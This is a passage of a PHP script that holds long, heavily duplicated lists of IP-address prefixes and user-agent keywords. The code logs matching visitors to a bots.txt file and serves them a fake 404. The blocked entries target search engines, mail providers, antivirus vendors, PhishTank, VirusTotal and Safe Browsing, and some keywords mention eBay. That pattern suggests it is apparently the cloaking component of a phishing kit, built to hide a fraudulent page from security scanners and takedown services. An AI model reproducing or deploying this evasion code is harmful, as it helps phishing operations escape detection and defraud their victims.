           "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
           "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
           "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
           "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
           "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
           "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
           "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
          "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
          "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
          "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
           "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
          "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
           "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
           "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
          "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
          "^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
          "^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
          "^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
          "^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
          "^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
          "^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
          "^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
          "^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
          "^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
          "^64.233.173.*" , "^64.68.90.*",
          "^66.102.*.*",
               "^38.100.*.*",
               "^107.170.*.*",
               "^149.20.*.*",
               "^38.105.*.*",
               "^74.125.*.*",
               "^66.150.14.*",
               "^54.176.*.*",
               "^38.100.*.*",
               "^184.173.*.*",
               "^66.249.*.*",
               "^128.242.*.*",
               "^72.14.192.*",
               "^208.65.144.*",
               "^74.125.*.*",
               "^209.85.128.*",
               "^216.239.32.*",
               "^74.125.*.*",
               "^207.126.144.*",
               "^173.194.*.*",
               "^64.233.160.*",
               "^72.14.192.*",
               "^66.102.*.*",
               "^64.18.*.*",
               "^194.52.68.*",
               "^194.72.238.*",
               "^62.116.207.*",
               "^212.50.193.*",
               "^69.65.*.*",
               "^50.7.*.*",
               "^131.212.*.*",
               "^46.116.*.* ",
               "^62.90.*.*",
               "^89.138.*.*",
               "^82.166.*.*",
               "^85.64.*.*",
               "^85.250.*.*",
               "^89.138.*.*",
               "^93.172.*.*",
               "^109.186.*.*",
               "^194.90.*.*",
               "^212.29.192.*",
               "^212.29.224.*",
               "^212.143.*.*",
               "^212.150.*.*",
               "^212.235.*.*",
               "^217.132.*.*",
               "^50.97.*.*",
               "^217.132.*.*",
               "^209.85.*.*",
               "^66.205.64.*",
               "^204.14.48.*",
               "^64.27.2.*",
               "^67.15.*.*",
               "^202.108.252.*",
               "^193.47.80.*",
               "^64.62.136.*",
               "^66.221.*.*",
               "^64.62.175.*",
               "^198.54.*.*",
               "^192.115.134.*",
               "^216.252.167.*",
               "^193.253.199.*",
               "^69.61.12.*",
               "^64.37.103.*",
               "^38.144.36.*",
               "^64.124.14.*",
               "^206.28.72.*",
               "^209.73.228.*",
               "^158.108.*.*",
               "^168.188.*.*",
               "^66.207.120.*",
               "^167.24.*.*",
               "^192.118.48.*",
               "^67.209.128.*",
               "^12.148.209.*",
               "^12.148.196.*",
               "^193.220.178.*",
               "68.65.53.71",
               "^198.25.*.*",
               "^64.106.213.*",
               "^54.228.218.117",
               "^54.228.218.*",
               "^185.28.20.243",
               "^185.28.20.*",
               "^217.16.26.166",
               "^217.16.26.*
               ^206.207.*.*", "^209.19.*.*", "^207.70.*.*", "^185.75.*.*", "^193.226.*.*", "^66.102.*.*", "^64.71.*.*", "^69.164.*.*", "^64.74.*.*", "^64.235.*.*", "^4.14.64.*.*", "^4.14.64.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^72.13.86.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*",  "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^4.14.0.0",
               "^206.207.*.*",
           "^209.19.*.*",
           "^207.70.*.*",
           "^185.75.*.*",
           "^193.226.*.*",
           "^66.102.*.*",
           "^64.71.*.*",
           "^69.164.*.*",
           "^64.74.*.*",
           "^64.235.*.*",
           "^4.14.64.*.*",
           "^4.14.64.*",
           "^38.100.*.*",
           "^107.170.*.*",
           "^149.20.*.*",
           "^38.105.*.*",
           "^74.125.*.*",
            "^66.150.14.*",
           "^54.176.*.*",
           "^38.100.*.*",
           "^184.173.*.*",
           "^66.249.*.*",
           "^128.242.*.*",
           "^72.14.192.*",
           "^72.13.86.*",
           "^208.65.144.*",
           "^74.125.*.*",
           "^209.85.128.*",
           "^216.239.32.*",
           "^74.125.*.*",
           "^207.126.144.*",
           "^173.194.*.*",
           "^64.233.160.*",
           "^72.14.192.*",
           "^66.102.*.*",
           "^64.18.*.*",
           "^194.52.68.*",
           "^194.72.238.*",
           "^62.116.207.*",
           "^212.50.193.*",
           "^69.65.*.*",
           "^131.212.*.*",
           "^46.116.*.* ",
           "^62.90.*.*",
           "^89.138.*.*",
           "^82.166.*.*",
           "^85.64.*.*",
           "^85.250.*.*",
           "^89.138.*.*",
           "^93.172.*.*",
           "^109.186.*.*",
           "^194.90.*.*",
           "^212.29.192.*",
           "^212.29.224.*",
           "^212.143.*.*",
           "^212.150.*.*",
           "^212.235.*.*",
           "^217.132.*.*",
           "^50.97.*.*",
           "^217.132.*.*",
           "^209.85.*.*",
           "^66.205.64.*",
           "^204.14.48.*",
            "^64.27.2.*",
           "^67.15.*.*",
           "^202.108.252.*",
           "^193.47.80.*",
           "^64.62.136.*",
           "^66.221.*.*",
           "^64.62.175.*",
           "^198.54.*.*",
           "^192.115.134.*",
           "^216.252.167.*",
           "^193.253.199.*",
           "^69.61.12.*",
           "^64.37.103.*",
           "^38.144.36.*",
           "^64.124.14.*",
           "^206.28.72.*",
           "^209.73.228.*",
           "^158.108.*.*",
           "^168.188.*.*",
           "^66.207.120.*",
           "^167.24.*.*",
           "^192.118.48.*",
           "^67.209.128.*",
           "^12.148.209.*",
           "^12.148.196.*",
           "^193.220.178.*",
           "^68.65.53.71",
           "^198.25.*.*",
           "^4.14.0.0",
               '^104.236.153.*',
              '^107.170.*.*',
              '^64.71.206.*',
              '^64.71.205.*',
              '^64.71.204.*',
              '^66.102.8.*',
              '^157.55.39.*',
              '^105.107.79.*',
              '^4.14.64.*',
              '^64.74.215.*',
              '^198.186.190.*',
              '^198.186.191.*',
              '^198.186.192.*',
              '^198.186.193.*',
              '^109.186.*.*',
              '^12.148.196.*',
              '^12.148.209.*',
              '^128.242.*.*',
              '^131.212.*.*',
              '^149.20.*.*',
              '^158.108.*.*',
              '^163.195.178.*',
              '^167.24.*.*',
              '^168.188.*.*',
              '^173.194.*.*',
              '^173.224.160.*',
              '^173.224.161.*',
              '^173.224.162.*',
              '^173.224.163.*',
              '^173.224.164.*',
              '^173.224.165.*',
              '^173.224.166.*',
              '^173.224.167.*',
              '^184.173.*.*',
              '^192.115.134.*',
              '^192.118.48.*',
              '^193.220.178.*',
              '^193.253.199.*',
              '^193.47.80.*',
              '^194.52.68.*',
              '^194.72.238.*',
              '^194.90.*.*',
              '^198.25.*.*',
              '^198.54.*.*',
              '^199.30.228.*',
              '^202.108.252.*',
              '^204.14.48.*',
              '^206.28.72.*',
              '^207.126.144.*',
              '^208.65.144.*',
              '^208.91.115.*',
              '^209.73.228.*',
              '^209.85.*.*',
              '^209.85.128.*',
              '^212.143.*.*',
              '^212.150.*.*',
              '^212.235.*.*',
              '^212.29.192.*',
              '^212.29.224.*',
              '^212.50.193.*',
              '^216.10.193.*',
              '^216.239.32.*',
              '^216.252.167.*',
              '^217.132.*.*',
              '^217.132.*.*',
              '^38.100.*.*',
              '^38.100.*.*',
              '^38.105.*.*',
              '^38.144.36.*',
              '^46.116.*.* ',
              '^50.7.*.*',
              '^50.97.*.*',
              '^54.176.*.*',
              '^62.116.207.*',
              '^62.90.*.*',
              '^64.106.213.*',
              '^64.124.14.*',
              '^64.18.*.*',
              '^64.233.160.*',
              '^64.27.2.*',
              '^64.37.103.*',
              '^64.62.136.*',
              '^64.62.175.*',
              '^66.102.*.*',
              '^66.102.*.*',
              '^66.135.200.*',
              '^66.150.14.*',
              '^66.205.64.*',
              '^66.207.120.*',
              '^66.221.*.*',
              '^66.249.*.*',
              '^67.15.*.*',
              '^67.209.128.*',
              '^68.65.53.71',
              '^69.61.12.*',
              '^69.65.*.*',
              '^72.14.192.*',
              '^72.14.192.*',
              '^74.125.*.*',
              '^74.125.*.*',
              '^74.125.*.*',
              '^81.161.59.*',
              '^82.166.*.*',
              '^85.250.*.*',
              '^85.64.*.*',
              '^89.138.*.*',
              '^89.138.*.*',
              '^91.103.66.*',
              '^93.172.*.*',
              "^81.161.59.*",
          "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^66.102.*.*","^104.236.153.*","^65.55.85.12","^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
          "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
          "^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
          "^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
          "^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
          "^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
          "^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
          "^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
          "^65.54.188.110","^1.128.96.181","^65.208.151.*","^1.132.97.75","^1.152.96.223",
          "^38.100.*.*","^185.20.5.*","^185.20.4.*","^95.76.156.*","^216.58.211.37","^173.194.116.149",
          "^107.170.*.*","^64.68.90.*","^64.233.173.*","^216.33.229.163","^216.239.*.*","^89.163.159.214",
          "^149.20.*.*","^219.117.238.170","^79.79.148.223","^62.149.225.67","^104.131.165.123","^46.101.249.238","^79.79.147.162","^178.62.113.173","^1.152.97.32","^101.174.147.73","27.54.62.91","4.14.64.*",
          "^38.105.*.*",
          "^74.125.*.*",
          "^66.150.14.*",
          "^54.176.*.*",
          "^38.100.*.*",
          "^184.173.*.*",
          "^66.249.*.*",
          "^128.242.*.*",
          "^72.14.192.*",
          "^208.65.144.*",
          "^74.125.*.*",
          "^209.85.128.*",
          "^216.239.32.*",
          "^74.125.*.*",
          "^207.126.144.*",
          "^173.194.*.*",
          "^64.233.160.*",
          "^72.14.192.*",
          "^66.102.*.*",
          "^64.18.*.*",
          "^194.52.68.*",
          "^194.72.238.*",
          "^62.116.207.*",
          "^212.50.193.*",
          "^69.65.*.*",
          "^50.7.*.*",
          "^131.212.*.*",
          "^46.116.*.* ",
          "^62.90.*.*",
          "^89.138.*.*",
          "^82.166.*.*",
          "^85.64.*.*",
          "^85.250.*.*",
          "^89.138.*.*",
          "^93.172.*.*",
          "^109.186.*.*",
          "^194.90.*.*",
          "^212.29.192.*",
          "^212.29.224.*",
          "^212.143.*.*",
          "^212.150.*.*",
          "^212.235.*.*",
          "^217.132.*.*",
          "^50.97.*.*",
          "^217.132.*.*",
          "^209.85.*.*",
          "^66.205.64.*",
          "^204.14.48.*",
          "^64.27.2.*",
          "^67.15.*.*",
          "^202.108.252.*",
          "^193.47.80.*",
          "^64.62.136.*",
          "^66.221.*.*",
          "^64.62.175.*",
          "^198.54.*.*",
          "^192.115.134.*",
          "^216.252.167.*",
          "^193.253.199.*",
          "^69.61.12.*",
          "^64.37.103.*",
          "^38.144.36.*",
          "^64.124.14.*",
          "^206.28.72.*",
          "^209.73.228.*",
          "^158.108.*.*",
          "^168.188.*.*",
          "^66.207.120.*",
          "^167.24.*.*",
          "^192.118.48.*",
          "^67.209.128.*",
          "^12.148.209.*",
          "^12.148.196.*",
          "^193.220.178.*",
          "^68.65.53.71",
          "^64.235.153.*","^64.235.154.*",
          "^198.25.*.*",
          "^64.106.213.*",
          "54.228.218.117",
          "^54.228.218.*",
          "185.28.20.243",
          "^185.28.20.*",
          "217.16.26.166",
          "162.224.156.32",
          "^204.101.161.159",
          "^217.16.26.*",
          "^216.162.209.*",
          "^64.71.193.*",
          "^185.75.141.32",
          "^209.66.70.*",
          "^207.70.60.*",
          "^209.19.185.*",
          "^209.*",
          "^104.236.153.*",
          "^107.170.*.*",
          "^109.186.*.*",
          "^12.148.196.*",
          "^12.148.209.*",
          "^128.242.*.*",
          "^131.212.*.*",
          "^149.20.*.*",
          "^158.108.*.*",
          "^163.195.178.*",
          "^167.24.*.*",
          "^168.188.*.*",
          "^173.194.*.*",
          "^173.224.160.*",
          "^173.224.161.*",
          "^173.224.162.*",
          "^173.224.163.*",
          "^173.224.164.*",
          "^173.224.165.*",
          "^173.224.166.*",
          "^173.224.167.*",
          "^184.173.*.*",
          "^192.115.134.*",
          "^192.118.48.*",
          "^193.220.178.*",
          "^193.253.199.*",
          "^193.47.80.*",
          "^194.52.68.*",
          "^194.72.238.*",
          "^194.90.*.*",
          "^198.25.*.*",
          "^198.54.*.*",
          "^199.30.228.*",
          "^202.108.252.*",
          "^204.14.48.*",
          "^206.28.72.*",
          "^207.126.144.*",
          "^208.65.144.*",
          "^208.91.115.*",
          "^209.73.228.*",
          "^209.85.*.*",
          "^209.85.128.*",
          "^212.143.*.*",
          "^212.150.*.*",
          "^212.235.*.*",
          "^212.29.192.*",
          "^212.29.224.*",
          "^212.50.193.*",
          "^216.10.193.*",
          "^216.239.32.*",
          "^216.252.167.*",
          "^217.132.*.*",
          "^217.132.*.*",
          "^38.100.*.*",
          "^38.100.*.*",
          "^38.105.*.*",
          "^38.144.36.*",
          "^46.116.*.* ",
          "^50.7.*.*",
          "^50.97.*.*",
          "^54.176.*.*",
          "^62.116.207.*",
          "^62.90.*.*",
          "^64.106.213.*",
          "^64.124.14.*",
          "^64.18.*.*",
          "^64.233.160.*",
          "^64.27.2.*",
          "^64.37.103.*",
          "^64.62.136.*",
          "^64.62.175.*",
          "^66.102.*.*",
          "^66.102.*.*",
          "^66.135.200.*",
          "^66.150.14.*",
          "^66.205.64.*",
          "^66.207.120.*",
          "^66.221.*.*",
          "^66.249.*.*",
          "^67.15.*.*",
          "^67.209.128.*",
          "^68.65.53.71",
          "^69.61.12.*",
          "^69.65.*.*",
          "^72.14.192.*",
          "^72.14.192.*",
          "^74.125.*.*",
          "^74.125.*.*",
          "^74.125.*.*",
          "^81.161.59.*",
          "^82.166.*.*",
          "^85.250.*.*",
          "^85.64.*.*",
          "^89.138.*.*",
          "^89.138.*.*",
          "^91.103.66.*",
          "^93.172.*.*",
          "^95.76.156.*",
          "^64.71.*.*",
          "^203.188.221.*",
          "^209.19.186.231",
          "^206.207.80.*",
          "^209.19.*.*",
          "^206.80.*.*",
          "^207.80.*.*",
          "^207.70.60.*",
          "^108.210.106.*",
          "^173.14.18.*",
          "^52.90.*.*",
          "^35.172.115.*",
          "^54.164.*.*",
          "^222.154.252.*",
          "^195.211.23.*",
          "^13.57.36.*",
          "^210.55.200.*",
          "^42.112.8.*"
          );
          
              foreach($ips as $ip) {
                  if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
          
                      $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blacklist ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
                  }
              }
          
          $dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
          $blocked_words = array(
               "bot",
               "above",
               "google",
               "docomo",
               "mediapartners",
               "phantomjs",
               "lighthouse",
               "reverseshorturl",
               "samsung-sgh-e250",
               "softlayer",
               "amazonaws",
               "cyveillance",
               "crawler",
               "gsa-crawler",
               "phishtank",
               "dreamhost",
               "netpilot",
               "calyxinstitute",
               "tor-exit",
               "apache-httpclient",
               "lssrocketcrawler",
               "crawler",
               "urlredirectresolver",
               "jetbrains",
               "spam",
               "windows 95",
               "windows 98",
               "acunetix",
               "netsparker",
               "007ac9",
               "008",
               "Feedfetcher",
               "192.comagent",
               "200pleasebot",
               "360spider",
               "4seohuntbot",
               "50.nu",
               "a6-indexer",
               "admantx",
               "amznkassocbot",
               "aboundexbot",
               "aboutusbot",
               "abrave spider",
               "accelobot",
               "acoonbot",
               "addthis.com",
               "adsbot-google",
               "ahrefsbot",
               "alexabot",
               "amagit.com",
               "analytics",
               "antbot",
               "apercite",
               "aportworm",
               "EBAY",
               "CL0NA",
               "jabber",
               "ebay",
               "arabot",
               "hotmail!",
               "msn!",
               "baidu",
               "outlook!",
               "outlook",
               "msn",
               "duckduckbot",
               "hotmail",
               "go-http-client",
               "go-http-client/1.1",
               "trident",
               "presto",
               "virustotal",
               "unchaos",
               "dreampassport",
               "sygol",
               "nutch",
               "privoxy",
               "zipcommander",
               "neofonie",
               "abacho",
               "acoi",
               "acoon",
               "adaxas",
               "agada",
               "aladin",
               "alkaline",
               "amibot",
               "anonymizer",
               "aplix",
               "aspseek",
               "avant",
               "baboom",
               "anzwers",
               "anzwerscrawl",
               "crawlconvera",
               "del.icio.us",
               "camehttps",
               "annotate",
               "wapproxy",
               "translate",
               "feedfetcher",
               "ask24",
               "asked",
               "askaboutoil",
               "fangcrawl",
               "amzn_assoc",
               "bingpreview",
               "dr.web",
               "drweb",
               "bilbo",
               "blackwidow",
               "sogou",
               "sogou-test-spider",
               "exabot",
               "externalhit",
               "ia_archiver",
               "googletranslate",
               "translate",
               "proxy",
               "dalvik",
               "quicklook",
               "seamonkey",
               "sylera",
               "safebrowsing",
               "safesurfingwidget",
               "preview",
               "whatsapp",
               "telegram",
               "instagram",
               "zteopen",
               "icoreservice",
               "untrusted"
          
          );
              foreach($blocked_words as $word2) {
                  if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
          
                      $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bad words ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
                  }
              }
          
          $Bot = array(
              "abot",
              "dbot",
              "ebot",
              "hbot",
              "kbot",
              "lbot",
              "mbot",
              "nbot",
              "obot",
              "pbot",
              "rbot",
              "sbot",
              "tbot",
              "vbot",
              "ybot",
              "zbot",
              "bot.",
              "bot/",
              "_bot",
              ".bot",
              "/bot",
              "-bot",
              ":bot",
              "(bot",
              "crawl",
              "slurp",
              "spider",
              "seek",
              "avg",
              "avira",
              "bitdefender",
              "kaspersky",
              "sophos",
              "virustotal",
              "virus",
              "accoona",
              "acoon",
              "adressendeutschland",
              "ah-ha.com",
              "ahoy",
              "altavista",
              "ananzi",
              "anthill",
              "appie",
              "arachnophilia",
              "arale",
              "araneo",
              "aranha",
              "architext",
              "aretha",
              "arks",
              "asterias",
              "atlocal",
              "atn",
              "atomz",
              "augurfind",
              "backrub",
              "bannana_bot",
              "baypup",
              "bdfetch",
              "big brother",
              "biglotron",
              "bjaaland",
              "blackwidow",
              "blaiz",
              "blog",
              "blo.",
              "bloodhound",
              "boitho",
              "booch",
              "bradley",
              "butterfly",
              "calif",
              "cassandra",
              "ccubee",
              "cfetch",
              "charlotte",
              "churl",
              "cienciaficcion",
              "cmc",
              "collective",
              "comagent",
              "combine",
              "computingsite",
              "csci",
              "curl",
              "cusco",
              "daumoa",
              "deepindex",
              "delorie",
              "depspid",
              "deweb",
              "die blinde kuh",
              "digger",
              "ditto",
              "dmoz",
              "docomo",
              "download express",
              "dtaagent",
              "dwcp",
              "ebiness",
              "ebingbong",
              "e-collector",
              "ejupiter",
              "emacs-w3 search engine",
              "esther",
              "evliya celebi",
              "ezresult",
              "falcon",
              "felix ide",
              "ferret",
              "fetchrover",
              "fido",
              "findlinks",
              "fireball",
              "fish search",
              "fouineur",
              "funnelweb",
              "gazz",
              "gcreep",
              "genieknows",
              "getterroboplus",
              "geturl",
              "glx",
              "goforit",
              "golem",
              "grabber",
              "grapnel",
              "gralon",
              "griffon",
              "gromit",
              "grub",
              "gulliver",
              "hamahakki",
              "harvest",
              "havindex",
              "helix",
              "heritrix",
              "hku www octopus",
              "homerweb",
              "htdig",
              "html index",
              "html_analyzer",
              "htmlgobble",
              "hubater",
              "hyper-decontextualizer",
              "ia_archiver",
              "ibm_planetwide",
              "ichiro",
              "iconsurf",
              "iltrovatore",
              "image.kapsi.net",
              "imagelock",
              "incywincy",
              "indexer",
              "infobee",
              "informant",
              "ingrid",
              "inktomisearch.com",
              "inspector web",
              "intelliagent",
              "internet shinchakubin",
              "ip3000",
              "iron33",
              "israeli-search",
              "ivia",
              "jack",
              "jakarta",
              "javabee",
              "jetbot",
              "jumpstation",
              "katipo",
              "kdd-explorer",
              "kilroy",
              "knowledge",
              "kototoi",
              "kretrieve",
              "labelgrabber",
              "lachesis",
              "larbin",
              "legs",
              "libwww",
              "linkalarm",
              "link validator",
              "linkscan",
              "lockon",
              "lwp",
              "lycos",
              "magpie",
              "mantraagent",
              "mapoftheinternet",
              "marvin/",
              "mattie",
              "mediafox",
              "mediapartners",
              "mercator",
              "merzscope",
              "microsoft url control",
              "minirank",
              "miva",
              "mj12",
              "mnogosearch",
              "moget",
              "monster",
              "moose",
              "motor",
              "multitext",
              "muncher",
              "muscatferret",
              "mwd.search",
              "myweb",
              "najdi",
              "nameprotect",
              "nationaldirectory",
              "nazilla",
              "ncsa beta",
              "nec-meshexplorer",
              "nederland.zoek",
              "netcarta webmap engine",
              "netmechanic",
              "netresearchserver",
              "netscoop",
              "newscan-online",
              "nhse",
              "nokia6682/",
              "nomad",
              "noyona",
              "siteexplorer",
              "nutch",
              "nzexplorer",
              "objectssearch",
              "occam",
              "omni",
              "open text",
              "openfind",
              "openintelligencedata",
              "orb search",
              "osis-project",
              "pack rat",
              "pageboy",
              "pagebull",
              "page_verifier",
              "panscient",
              "parasite",
              "partnersite",
              "patric",
              "pear.",
              "pegasus",
              "peregrinator",
              "pgp key agent",
              "phantom",
              "phpdig",
              "picosearch",
              "piltdownman",
              "pimptrain",
              "pinpoint",
              "pioneer",
              "piranha",
              "plumtreewebaccessor",
              "pogodak",
              "poirot",
              "pompos",
              "poppelsdorf",
              "poppi",
              "popular iconoclast",
              "psycheclone",
              "publisher",
              "python",
              "rambler",
              "raven search",
              "roach",
              "road runner",
              "roadhouse",
              "robbie",
              "robofox",
              "robozilla",
              "rules",
              "salty",
              "sbider",
              "scooter",
              "scoutjet",
              "scrubby",
              "search.",
              "searchprocess",
              "semanticdiscovery",
              "senrigan",
              "sg-scout",
              "shai'hulud",
              "shark",
              "shopwiki",
              "sidewinder",
              "sift",
              "silk",
              "simmany",
              "site searcher",
              "site valet",
              "sitetech-rover",
              "skymob.com",
              "sleek",
              "smartwit",
              "sna-",
              "snappy",
              "snooper",
              "sohu",
              "speedfind",
              "sphere",
              "sphider",
              "spinner",
              "spyder",
              "steeler/",
              "suke",
              "suntek",
              "supersnooper",
              "surfnomore",
              "sven",
              "sygol",
              "szukacz",
              "tach black widow",
              "tarantula",
              "templeton",
              "/teoma",
              "t-h-u-n-d-e-r-s-t-o-n-e",
              "theophrastus",
              "titan",
              "titin",
              "tkwww",
              "toutatis",
              "t-rex",
              "tutorgig",
              "twiceler",
              "twisted",
              "ucsd",
              "udmsearch",
              "url check",
              "updated",
              "vagabondo",
              "valkyrie",
              "verticrawl",
              "victoria",
              "vision-search",
              "volcano",
              "voyager/",
              "voyager-hc",
              "w3c_validator",
              "w3m2",
              "w3mir",
              "walker",
              "wallpaper",
              "wanderer",
              "wauuu",
              "wavefire",
              "web core",
              "web hopper",
              "web wombat",
              "webbandit",
              "webcatcher",
              "webcopy",
              "webfoot",
              "weblayers",
              "weblinker",
              "weblog monitor",
              "webmirror",
              "webmonkey",
              "webquest",
              "webreaper",
              "websitepulse",
              "websnarf",
              "webstolperer",
              "webvac",
              "webwalk",
              "webwatch",
              "webwombat",
              "webzinger",
              "wget",
              "whizbang",
              "whowhere",
              "wild ferret",
              "worldlight",
              "wwwc",
              "wwwster",
              "xenu",
              "xget",
              "xift",
              "xirq",
              "yandex",
              "yanga",
              "yeti",
              "yodao",
              "zao/",
              "zippp",
              "zyborg",
              "proximic",
              "Googlebot",
              "Baiduspider",
              "Cliqzbot",
              "A6-Indexer",
              "AhrefsBot",
              "Genieo",
              "BomboraBot",
              "CCBot",
              "URLAppendBot",
              "DomainAppender",
              "msnbot-media",
              "Antivirus",
              "YoudaoBot",
              "MJ12bot",
              "linkdexbot",
              "Go-http-client",
              "presto",
              "BingPreview",
              "go-http-client",
               "go-http-client/1.1",
               "trident",
               "presto",
               "virustotal",
               "unchaos",
               "dreampassport",
               "sygol",
               "nutch",
               "privoxy",
               "zipcommander",
               "neofonie",
               "abacho",
               "acoi",
               "acoon",
               "adaxas",
               "agada",
               "aladin",
               "alkaline",
               "amibot",
               "anonymizer",
               "aplix",
               "aspseek",
               "avant",
               "baboom",
               "anzwers",
               "anzwerscrawl",
               "crawlconvera",
               "del.icio.us",
               "camehttps",
               "annotate",
               "wapproxy",
               "translate",
               "feedfetcher",
               "ask24",
               "asked",
               "askaboutoil",
               "fangcrawl",
               "amzn_assoc",
               "bingpreview",
               "dr.web",
               "drweb",
               "bilbo",
               "blackwidow",
               "sogou",
               "sogou-test-spider",
               "exabot",
               "externalhit",
               "ia_archiver",
               "mj12",
               "okhttp",
               "simplepie",
               "curl",
               "wget",
               "virus",
               "pipes",
               "antivirus",
               "python",
               "ruby",
               "avast",
               "firebird",
               "scmguard",
               "adsbot",
               "weblight",
               "favicon",
               "analytics",
               "insights",
               "headless",
               "github",
               "node",
               "agusescan",
               "zteopen",
               "majestic12",
               "SimplePie",
               "SAMSUNG-SGH-E250",
               "DoCoMo/2.0 N905i",
               "SiteLockSpider",
